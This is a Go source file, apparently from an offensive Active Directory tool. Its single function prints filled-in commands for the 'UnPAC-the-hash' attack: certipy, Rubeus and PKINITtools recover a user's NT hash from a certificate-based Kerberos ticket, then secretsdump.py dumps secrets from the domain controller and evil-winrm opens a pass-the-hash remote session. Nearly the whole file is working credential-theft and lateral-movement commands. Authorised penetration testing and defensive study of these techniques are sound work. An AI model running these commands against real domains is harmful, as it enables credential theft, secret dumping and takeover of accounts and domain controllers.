package pki

import "fmt"

// PrintUnPACCommands prints commands to recover an NT hash from a PKINIT-obtained TGT.
// UnPAC-the-hash exploits the U2U (User-to-User) Kerberos extension to extract
// the encrypted PAC from a TGT, revealing the user's NT hash.
func PrintUnPACCommands(pfxPath, dc, domain, upn string) {
	fmt.Println("[+] UnPAC-the-Hash Commands")
	fmt.Println("    Recover NT hash from PKINIT TGT via U2U:")

	fmt.Println("    # certipy (performs PKINIT + UnPAC in one step)")
	fmt.Printf("    certipy auth -pfx %s -dc-ip %s -domain %s\n", pfxPath, dc, domain)
	fmt.Println("    # Look for 'Got hash' in output")

	fmt.Println("    # Rubeus (Windows — requests TGT + extracts credentials)")
	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap\n", upn, pfxPath)
	fmt.Println("    # Look for 'NTLM' hash in credential info")

	fmt.Println("    # PKINITtools (Python)")
	fmt.Printf("    python gettgtpkinit.py -cert-pfx %s -pfx-pass '' %s/%s %s.ccache\n", pfxPath, domain, upn, upn)
	fmt.Printf("    python getnthash.py -key <AS-REP-key> %s/%s\n\n", domain, upn)

	fmt.Println("    # After obtaining NT hash, pass-the-hash:")
	fmt.Printf("    secretsdump.py -hashes :<NTHASH> %s/%s@%s\n", domain, upn, dc)
	fmt.Printf("    evil-winrm -i %s -u %s -H <NTHASH>\n", dc, upn)
}
